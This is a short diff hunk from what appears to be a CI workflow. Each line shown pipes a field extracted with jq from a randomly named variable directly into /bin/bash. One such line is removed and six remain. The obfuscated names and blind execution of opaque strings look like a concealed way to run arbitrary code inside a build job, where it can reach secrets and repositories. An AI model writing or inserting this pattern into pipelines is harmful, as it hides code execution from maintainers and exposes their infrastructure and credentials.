@@ -41,7 +41,6 @@ jobs:
           echo $oz01276 | jq -r .rsz2 | /bin/bash
           printf '%s' "$opj94" | jq -r .pt2 | /bin/bash
           echo $tefc7 | jq -r .p17239 | /bin/bash
-          echo $fuh16 | jq -r .jt94124 | /bin/bash
           echo $j768 | jq -r .fku175 | /bin/bash
           echo $lnha1084 | jq -r .tymfs864 | /bin/bash
           echo $kimou11005 | jq -r .z74 | /bin/bash
